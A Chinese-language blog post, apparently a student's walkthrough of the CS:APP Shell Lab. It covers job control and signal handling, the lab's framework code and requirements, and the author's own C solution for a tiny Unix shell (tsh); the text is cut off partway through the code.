<p>例如，输入<code>tsh&gt; jobs</code>使得Shell执行内建的jobs命令，输入<code>tsh&gt; /bin/ls -l -d</code>则在前台运行ls程序，同时，这个程序的argc == 3，argv[0] == “/bin/ls”a，argv[1] == “-l”，argv[2] == “-d”。相应地，输入<code>tsh&gt; /bin/ls -l -d &amp;</code>则会在后台运行ls程序。</p>
<p>Unix Shell支持作业控制的概念，这允许用户将任务在前台和后台间来回移动，并且改变一个任务中进程的状态（运行，停止，终止）。按下ctrl-c将会发送SIGINT信号到当前前台任务的每一个进程中。按下ctrl-z将会发送SIGTSTP信号到前台任务的每一个进程中，SIGTSTP信号的默认功能是将进程设置为停止状态，直到其被一个SIGCONT信号唤醒。Unix Shell提供了不同的内建命令来支持作业控制，如：</p>
<ul>
<li>jobs - 打印运行的和停止的后台任务</li>
<li>bg <job> - 将一个停止的后台任务转变为一个运行的后台任务</job></li>
<li>fb <job> - 将一个运行的或是停止的后台任务转变为一个运行的前台任务</job></li>
<li>kill <job> - 终止一个任务</job></li>
</ul>
<h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><p>所实现的tsh shell应当具有如下的特性：</p>
<ul>
<li>提示符应当为<code>&quot;tsh&gt; &quot;</code></li>
<li>用户的命令行输入应当包括一个名字和0个或多个参数，均由一个或多个空格隔开。如果名字是一个内建命令，那么tsh应当立刻处理它并且等待下一个命令行输入。否则，tsh就会假设它是一个可执行文件的路径，并且在一个独立的子进程中加载并执行它</li>
<li>tsh不需要支持管道(|)和I/O重定向(&gt;和&lt;)</li>
<li>按下ctrl-c(ctrl-z)将会导致一个SIGINT(SIGTSTP)信号被发送至当前的前台任务，如果现在没有前台任务，那么这些信号将没有效果</li>
<li>如果命令行输入以一个<code>&#39;&amp;&#39;</code>结束，那么tsh将会在后台运行这个任务，否则它会在前台运行这个任务</li>
<li>每一个任务都可以被一个进程ID(PID)或是一个被tsh分配的正整数的任务ID(JID)唯一的标识。JIDS可以被前缀<code>&#39;%&#39;</code>标识，例如，<code>&#39;%5&#39;</code>就代表了JID 5，而<code>&#39;5&#39;</code>就代表了PID 5</li>
<li>tsh应当提供如下的内建命令：<ul>
<li>quit命令直接终止shell</li>
<li>jobs命令列出所有在后台运行的任务</li>
<li>bg <job>命令通过给<job>发送SIGCONT信号将其重启，然后将其在后台运行。参数<job>既可以是一个PID，也可以是一个JID</job></job></job></li>
<li>fg <job>命令通过给<job>发送SIGCONT信号将其重启，然后将其在前台运行。参数<job>既可以是一个PID，也可以使一个JID</job></job></job></li>
</ul>
</li>
<li>tsh应当回收它的所有僵死子进程。如果任何任务因为收到了一个未被捕获的信号而终止，那么tsh应当识别对应的事件并且输出相应的信息</li>
</ul>
<h2 id="实验评测"><a href="#实验评测" class="headerlink" title="实验评测"></a>实验评测</h2><ol>
<li>参考答案 - 实验提供了一个作为参考的tshref可执行文件作为tsh的参考。你的tsh应当提供和tshref一致的输出（除了PIDs以外）</li>
<li>Shell驱动 - sdriver.pl程序将shell作为一个子进程来执行，根据trace file来向它发送命令和信号，并且将shell的输出捕获并输出。实验总共提供了16个trace file。关于sdriver的具体用法请参考实验讲义。</li>
</ol>
<p>实验提供了tshref.out作为16个trace file在tshref程序下的参考输出。为了方便比较，写了一个小的（可能会有很多错误）的shell脚本gather_output.sh用来生成这些trace file在tsh下的输出，脚本如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin bash</span></div><div class="line"></div><div class="line">output_file=tsh.out</div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">""</span> &gt; tsh.out</div><div class="line"></div><div class="line"><span class="built_in">echo</span> -e <span class="string">"\n"</span> &gt;&gt; tsh.out</div><div class="line"></div><div class="line"><span class="keyword">for</span> trace_file <span class="keyword">in</span> ./*.txt</div><div class="line"><span class="keyword">do</span></div><div class="line">    <span class="built_in">echo</span> -e <span class="string">"`./sdriver.pl -t <span class="variable">$trace_file</span> -s ./tsh -a "</span>-p<span class="string">"`"</span> &gt;&gt; tsh.out</div><div class="line"><span class="keyword">done</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> -e <span class="string">"\n"</span> &gt;&gt; tsh.out</div></pre></td></tr></table></figure></p>
<h2 id="实验思路"><a href="#实验思路" class="headerlink" title="实验思路"></a>实验思路</h2><blockquote>
<p>最早在做这个实验的时候一直没有什么头绪，即使已经参考了实验讲义，使用trace file来指导编程（trace file的难度自简单到复杂）。后来还是先好好的阅读了一遍给出的框架源代码，整理如下。</p>
</blockquote>
<h3 id="框架代码分析"><a href="#框架代码分析" class="headerlink" title="框架代码分析"></a>框架代码分析</h3><h4 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h4><table>
<thead>
<tr>
<th>宏</th>
<th>描述</th>
<th>值</th>
</tr>
</thead>
<tbody>
<tr>
<td>MAXLINE</td>
<td>定义了命令行1行允许的最大字符数</td>
<td>1024</td>
</tr>
<tr>
<td>MAXARGS</td>
<td>定义了命令行所允许的最大参数个数</td>
<td>128</td>
</tr>
<tr>
<td>MAXJOBS</td>
<td>定义了命令行同一时间允许的最多任务个数</td>
<td>16</td>
</tr>
<tr>
<td>MAXJID</td>
<td>定义了最大的任务ID</td>
<td>1&lt;&lt;16</td>
</tr>
<tr>
<td>UNDEF</td>
<td>未定义的状态</td>
<td>0</td>
</tr>
<tr>
<td>FG</td>
<td>任务运行在前台</td>
<td>1</td>
</tr>
<tr>
<td>BG</td>
<td>任务运行在后台</td>
<td>2</td>
</tr>
<tr>
<td>ST</td>
<td>任务停止</td>
<td>3</td>
</tr>
</tbody>
</table>
<blockquote>
<p>允许如下的状态转换<br>FG -&gt; ST : ctrl-z<br>ST -&gt; FG : fg命令<br>BG -&gt; FG : fg命令<br>ST -&gt; BG : bg命令</p>
</blockquote>
<h4 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> &#123;</span>              <span class="comment">//任务</span></div><div class="line">    <span class="keyword">pid_t</span> pid;              <span class="comment">//任务的PID</span></div><div class="line">    <span class="keyword">int</span> jid;                <span class="comment">//任务JID [1, 2, ...]</span></div><div class="line">    <span class="keyword">int</span> state;              <span class="comment">//状态 - 包括UNDEF, BG, FG, ST</span></div><div class="line">    <span class="keyword">char</span> cmdline[MAXLINE];  <span class="comment">//对应的命令行输入</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><table>
<thead>
<tr>
<th>变量名</th>
<th>变量类型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>environ</td>
<td>char **</td>
<td>定义在libc中 环境变量</td>
</tr>
<tr>
<td>prompt</td>
<td>char[]</td>
<td>命令行提示符</td>
</tr>
<tr>
<td>verbose</td>
<td>int</td>
<td>为1时输出额外信息</td>
</tr>
<tr>
<td>nextjid</td>
<td>int</td>
<td>下一个待分配的JID</td>
</tr>
<tr>
<td>subf</td>
<td>char[MAXLINE]</td>
<td>用于生成sprintf信息</td>
</tr>
<tr>
<td>jobs</td>
<td>struct job_t [MAXJOBS]</td>
<td>全局任务表</td>
</tr>
</tbody>
</table>
<h4 id="函数列表"><a href="#函数列表" class="headerlink" title="函数列表"></a>函数列表</h4><table>
<thead>
<tr>
<th>函数名</th>
<th>函数原型</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>parseline</td>
<td>int parseline(const char <em>cmdline, char *</em>argv)</td>
<td>接收命令行输入以及参数列表，解析输入并且将解析到的参数存入参数列表，并且判断该命令是否以’&amp;’结尾，是则返回1，否则返回0</td>
</tr>
<tr>
<td>sigquit_handler</td>
<td>void sigquit_handler(int sig)</td>
<td>SIGQUIT的信号处理函数</td>
</tr>
<tr>
<td>clearjob</td>
<td>void clearjob(struct job_t *job)</td>
<td>将对应任务的PID，JID清零，状态设置为UNDEF，并且将命令行输入清空</td>
</tr>
<tr>
<td>initjobs</td>
<td>void initjobs(struct job_t *jobs)</td>
<td>将任务列表中的所有任务清空</td>
</tr>
<tr>
<td>maxjid</td>
<td>int maxjid(struct job_t *jobs)</td>
<td>返回任务列表中的最大JID</td>
</tr>
<tr>
<td>addjob</td>
<td>int addjob(struct job_t <em>jobs, pid_t pid, int state, char </em>cmdline)</td>
<td>将给定任务添加至任务列表，如果nextjid超过了MAXJOBS，则将其重置为1</td>
</tr>
<tr>
<td>deletejob</td>
<td>int deletejob(struct job_t *jobs, pid_t pid)</td>
<td>将对应任务从任务列表中删除，并将nextjid自增1</td>
</tr>
<tr>
<td>fgpid</td>
<td>pid_t fgpid(struct job_t *jobs)</td>
<td>返回当前前台任务的PID，如果没有则返回0</td>
</tr>
<tr>
<td>getjobpid</td>
<td>struct job_t <em>getjobpid(struct job_t </em>jobs, pid_t pid)</td>
<td>按照pid查询任务 如果没有则返回NULL</td>
</tr>
<tr>
<td>getjobjid</td>
<td>struct job_t <em>getjobjid(struct job_t </em>jobs, int jid)</td>
<td>按照jid查询任务 如果没有则返回NULL</td>
</tr>
<tr>
<td>pid2jid</td>
<td>int pid2jid(pid_t pid)</td>
<td>根据pid返回其jid，没有则返回0</td>
</tr>
<tr>
<td>listjobs</td>
<td>void listjobs(struct job_t *jobs)</td>
<td>打印任务队列</td>
</tr>
<tr>
<td>usage</td>
<td>void usage(void)</td>
<td>打印帮助信息</td>
</tr>
<tr>
<td>unix_error</td>
<td>void unix_error(char *msg)</td>
<td>打印系统级错误信息并结束进程</td>
</tr>
<tr>
<td>app_error</td>
<td>void app_error(char *msg)</td>
<td>打印应用级错误信息并结束进程</td>
</tr>
<tr>
<td>Signal</td>
<td>handler_t <em>Signal(int signum, handler_t </em>handler)</td>
<td>signal的包装函数</td>
</tr>
<tr>
<td>eval</td>
<td>void eval(char *cmdline)</td>
<td>求值函数</td>
</tr>
<tr>
<td>builtin_cmd</td>
<td>int builtin_cmd(char **argv)</td>
<td>处理内建函数</td>
</tr>
<tr>
<td>do_bgfg</td>
<td>void do_bgfg(char **argv)</td>
<td>实现内建的bg和fg</td>
</tr>
<tr>
<td>waitfg</td>
<td>void waitfg(pid_t pid)</td>
<td>等待前台的任务完成</td>
</tr>
<tr>
<td>sigchld_handler</td>
<td>void sigchld_handler(int sig)</td>
<td>SIGCHLD的信号处理程序</td>
</tr>
<tr>
<td>sigtstp_handler</td>
<td>void sigtstp_handler(int sig)</td>
<td>SIGTSTP的信号处理程序</td>
</tr>
<tr>
<td>sitint_handler</td>
<td>void sigint_handler(int sig)</td>
<td>SIGINT的信号处理程序</td>
</tr>
</tbody>
</table>
<h2 id="实验答案"><a href="#实验答案" class="headerlink" title="实验答案"></a>实验答案</h2><blockquote>
<p>为了简化篇幅，这里只附上几个相关的函数，已实现函数以及包装函数等就不一并附上。如有需要可以去GitHub中查看。</p>
</blockquote>
<p>实验答案为我自己的实验解法，很可能不是最优解法，请不要直接抄袭。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span> *cmdline)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">char</span> * argv[MAXARGS];</div><div class="line">    <span class="keyword">char</span> buf[MAXLINE];</div><div class="line">    <span class="keyword">int</span> bg; <span class="comment">/* if run in background */</span></div><div class="line">    <span class="keyword">pid_t</span> pid;</div><div class="line"></div><div class="line">    <span class="keyword">sigset_t</span> mask_all, mask_chld, prev_chld;</div><div class="line"></div><div class="line">    <span class="comment">/*initialize signal sets*/</span></div><div class="line">    Sigfillset(&amp;mask_all);</div><div class="line">    Sigemptyset(&amp;mask_chld);</div><div class="line">    Sigaddset(&amp;mask_chld, SIGCHLD);</div><div class="line"></div><div class="line">    <span class="built_in">strcpy</span>(buf, cmdline);</div><div class="line">    bg = parseline(buf, argv); <span class="comment">/* parse the command line */</span></div><div class="line">    <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>) &#123;</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125; <span class="comment">/* handles if there is empty input */</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!builtin_cmd(argv)) &#123; <span class="comment">/* if the command line is builtin command */</span></div><div class="line">        Sigprocmask(SIG_BLOCK, &amp;mask_chld, &amp;prev_chld); <span class="comment">/* block SIGCHLD to avoid potential race between addjob and deletejob */</span></div><div class="line">        <span class="keyword">if</span> ((pid = Fork()) == <span class="number">0</span>) &#123;</div><div class="line">            Setpgid(<span class="number">0</span>, <span class="number">0</span>); <span class="comment">/* give the child process a new group id to handle SIGINT correctly */</span></div><div class="line">            Sigprocmask(SIG_SETMASK, &amp;prev_chld, <span class="literal">NULL</span>); <span class="comment">/* unblock SIGCHLD */</span></div><div class="line">            Execve(argv[<span class="number">0</span>], argv, environ);</div><div class="line">        &#125;</div><div class="line">        Sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>); <span class="comment">/* mask all signals to avoid potential races */</span></div><div class="line">        addjob(jobs, pid, bg + <span class="number">1</span>, cmdline); <span class="comment">/* add job to joblist */</span></div><div class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_chld, <span class="literal">NULL</span>);</div><div class="line">        <span class="keyword">if</span> (!bg) &#123; <span class="comment">/* if the process should be exeuted in foreground */</span></div><div class="line">            waitfg(pid); <span class="comment">/* fg wait explictly */</span></div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, pid2jid(pid), pid, cmdline); <span class="comment">/* bg print message*/</span></div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="comment">/* handles the builtin command in current context */</span></div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"quit"</span>)) &#123;</div><div class="line">        <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">/* quit: exit directly*/</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"jobs"</span>)) &#123;</div><div class="line">        listjobs(jobs); <span class="comment">/* jobs: print the current job list */</span></div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>) || !<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) &#123;</div><div class="line">        do_bgfg(argv); <span class="comment">/* bg|fg: handles in function do_bgfg */</span></div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"&amp;"</span>)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>; <span class="comment">/* returns 1 for empty &amp; */</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> number = <span class="number">0</span>; <span class="comment">/* used to store the converted number */</span></div><div class="line">    <span class="keyword">char</span> * ptr = argv[<span class="number">1</span>]; <span class="comment">/* get the pointer to argument 1 */</span></div><div class="line">    <span class="keyword">char</span> * endptr = <span class="literal">NULL</span>; <span class="comment">/* used for error handling */</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">job</span> = <span class="title">NULL</span>;</span> <span class="comment">/* used to store job pointer */</span></div><div class="line">    <span class="keyword">if</span> (!argv[<span class="number">1</span>]) &#123; <span class="comment">/* returns if missing argument */</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">        <span class="keyword">return</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (*ptr == <span class="string">'%'</span>) &#123; <span class="comment">/* if argument 1 is job ID */</span></div><div class="line">        ptr++; <span class="comment">/* adjust pointer */</span></div><div class="line">        number = strtol(ptr, &amp;endptr, <span class="number">10</span>);</div><div class="line">        <span class="keyword">if</span> (ptr == endptr) &#123; <span class="comment">/* handles convert error */</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        job = getjobjid(jobs, number); <span class="comment">/* get the job */</span></div><div class="line">        <span class="keyword">if</span> (!job) &#123;<span class="comment">/* handles if there is no such job */</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%%%d: No such job\n"</span>, number);</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">/* if argument 1 is pid */</span></div><div class="line">        number = strtol(ptr, &amp;endptr, <span class="number">10</span>);</div><div class="line">        <span class="keyword">if</span> (ptr == endptr) &#123; <span class="comment">/* handles convert error */</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">        job = getjobpid(jobs, (<span class="keyword">pid_t</span>)number); <span class="comment">/* get the job */</span></div><div class="line">        <span class="keyword">if</span> (!job) &#123;<span class="comment">/* handles if there is no such job */</span></div><div class="line">            <span class="built_in">printf</span>(<span class="string">"(%d): No such process\n"</span>, number);</div><div class="line">            <span class="keyword">return</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="comment">/* change process state and update the job list*/</span></div><div class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>)) &#123; <span class="comment">/*bg: turns ST to BG, send SIGCONT */</span></div><div class="line">        <span class="keyword">if</span>(job-&gt;state == ST) &#123;</div><div class="line">            Kill(-(job-&gt;pid), SIGCONT);</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</div><div class="line">            job-&gt;state = BG;</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>)) &#123;<span class="comment">/* fg: turns ST/BG to FG, sent SIGCONT */</span></div><div class="line">        <span class="keyword">if</span>(job-&gt;state == ST) &#123;</div><div class="line">            Kill(-(job-&gt;pid), SIGCONT);</div><div class="line">            job-&gt;state = BG;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span>(job-&gt;state == BG) &#123;</div><div class="line">            job-&gt;state = FG;</div><div class="line">            waitfg(job-&gt;pid);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">while</span>(fgpid(jobs)) &#123; <span class="comment">/* handles all zombie processes in signal handler */</span></div><div class="line">        sleep(<span class="number">0.01</span>); <span class="comment">/* busy loop only */</span></div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> olderrno = errno; <span class="comment">/* store old errno */</span></div><div class="line">    <span class="keyword">int</span> status; <span class="comment">/* used to trace pid's status */</span></div><div class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</div><div class="line">    <span class="keyword">pid_t</span> pid;</div><div class="line"></div><div class="line">    Sigfillset(&amp;mask_all);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>((pid = Waitpid(<span class="number">-1</span>, &amp;status, WUNTRACED | WNOHANG)) &gt; <span class="number">0</span>) &#123; <span class="comment">/* waitpid without waiting(WNOHANG) */</span></div><div class="line">        <span class="keyword">if</span> (WIFSTOPPED(status) &amp;&amp; (WSTOPSIG(status) == SIGTSTP || WSTOPSIG(status) == SIGSTOP)) &#123; <span class="comment">/* if the process is stopped */</span></div><div class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></div><div class="line">            <span class="keyword">if</span> (job &amp;&amp; job-&gt;state != ST) &#123; <span class="comment">/* if the stop signal hasn't been catched */</span></div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>, pid2jid(pid), pid, WSTOPSIG(status));</div><div class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">stpjob</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></div><div class="line">                stpjob-&gt;state = ST;<span class="comment">/* handles here */</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (WIFSIGNALED(status) &amp;&amp; WTERMSIG(status) == SIGINT) &#123; <span class="comment">/* it the terminate signal hasn't been catched */</span></div><div class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">job</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></div><div class="line">            <span class="keyword">if</span> (job) &#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, pid2jid(pid), pid, WTERMSIG(status));</div><div class="line">                <span class="comment">/* handles here */</span></div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">if</span> (WIFEXITED(status) || WIFSIGNALED(status)) &#123;</div><div class="line">            Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</div><div class="line">            deletejob(jobs, pid);</div><div class="line">            Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</div><div class="line">        &#125;<span class="comment">/* remove the job in job list accordingly */</span></div><div class="line">    &#125;</div><div class="line">    errno = olderrno;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> olderrno = errno; <span class="comment">/* store old errno */</span></div><div class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</div><div class="line">    Sigfillset(&amp;mask_all);</div><div class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); <span class="comment">/* block all signal in case the race between SIGINT and SIGCHLD */</span></div><div class="line"></div><div class="line">    <span class="keyword">pid_t</span> pid;</div><div class="line">    pid = fgpid(jobs);</div><div class="line">    Kill(-pid, SIGINT); <span class="comment">/* kill processes in fg job's process group */</span></div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, pid2jid(pid), pid, sig); <span class="comment">/* print the message */</span></div><div class="line"></div><div class="line">    deletejob(jobs, pid); <span class="comment">/* delete job in joblist */</span></div><div class="line"></div><div class="line">    Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">    errno = olderrno;</div><div class="line">    <span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> olderrno = errno; <span class="comment">/* store old errno */</span></div><div class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</div><div class="line">    Sigfillset(&amp;mask_all);</div><div class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); <span class="comment">/* block all signal in case the race between SIGTSTP and SIGCHLD */</span></div><div class="line"></div><div class="line">    <span class="keyword">pid_t</span> pid;</div><div class="line">    pid = fgpid(jobs);</div><div class="line">    Kill(-pid, SIGTSTP); <span class="comment">/* send SIGTSTP to fg job's process group */</span></div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>, pid2jid(pid), pid, sig); <span class="comment">/* print the message */</span></div><div class="line"></div><div class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> * <span class="title">stpjob</span> = <span class="title">getjobpid</span>(<span class="title">jobs</span>, <span class="title">pid</span>);</span></div><div class="line">    stpjob-&gt;state = ST; <span class="comment">/* modify the job list */</span></div><div class="line"></div><div class="line">    Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">    errno = olderrno;</div><div 